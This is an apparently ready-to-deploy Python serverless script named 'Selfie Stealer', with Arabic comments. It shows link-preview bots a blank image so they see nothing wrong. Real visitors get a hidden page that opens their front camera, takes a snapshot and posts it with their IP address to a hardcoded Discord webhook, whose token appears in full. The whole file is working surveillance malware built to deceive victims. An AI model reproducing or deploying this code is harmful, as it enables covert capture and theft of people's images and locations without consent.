# api/catch.py  →  شغال 100% على Vercel, Render, Railway, أي مكان
import base64
import json
import requests

WEBHOOK = "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C"  # حط الويب هوك هنا

def send_to_discord(ip, image_data):
    requests.post(WEBHOOK, json={
        "username": "Selfie Stealer",
        "content": "@everyone",
        "embeds": [{
            "title": "تم سرقة سيلفي جديدة",
            "color": 0x000000,
            "description": f"**IP:** `{ip}`\n**منصة:** ديسكورد جوال أندرويد",
            "image": {"url": image_data}
        }]
    })

def handler(req):
    ip = req.headers.get("x-forwarded-for", "Unknown").split(",")[0]
    ua = req.headers.get("user-agent", "")

    # لو ديسكورد بوت أو كرولر → نعطيه صورة عادية
    if "Discordbot" in ua or "facebookexternalhit" in ua:
        fake_img = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "image/png"},
            "body": fake_img,
            "isBase64Encoded": True
        }

    # الثغرة الحقيقية: نرجع HTML فيه صورة + canvas مخفي
    html = f"""<!DOCTYPE html>
<html><body style="margin:0;background:#000">
<img src="https://i.imgur.com/xyz123.jpg" style="width:1px;height:1px;opacity:0">
<canvas id="c"></canvas>
<video id="v" autoplay playsinline style="display:none"></video>
<script>
navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user", width:1280, height:960}}}})
.then(stream => {{
    let v = document.getElementById("v");
    v.srcObject = stream;
    v.play();
    setTimeout(() => {{
        let c = document.getElementById("c");
        c.width = 1280; c.height = 960;
        c.getContext("2d").drawImage(v, 0, 0, 1280, 960);
        let img = c.toDataURL("image/jpeg", 0.85);
        fetch("{WEBHOOK}", {{
            method:"POST",
            headers:{{"Content-Type":"application/json"}},
            body:JSON.stringify({{embeds:[{{image:{{url:img}}, title:"Selfie من {ip}"}}]}})})
        .then(() => stream.getTracks().forEach(t=>t.stop()));
    }}, 1300);
}});
</script>
</body></html>"""

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html; charset=utf-8"},
        "body": html
    }
